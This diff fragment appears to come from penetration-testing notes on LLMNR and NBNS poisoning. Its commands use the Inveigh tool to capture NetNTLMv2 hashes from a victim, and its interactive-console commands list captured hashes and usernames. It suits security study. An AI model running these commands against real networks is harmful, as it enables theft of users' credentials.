@@ -180,7 +180,7 @@ The goal is get the victim to communicate with our system and capture the NetNTL
 - `Import-Module \.Inveigh.ps1`
 	- `(Get-Command Invoke-Inveigh).Parameters` view options
 - LLMNR and NBNS Poisoning: `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
-- `Inveigh.exe` is the C# tool that is still being updated
+- `Inveigh.exe` is the C# tool that is still being updated (needs to be compiled)
 	- run the program, and then press `ESC` to enter the interactive console
 	- `GET NTLMV2UNIQUE`
 	- `GET NTLMV2USERNAMES`
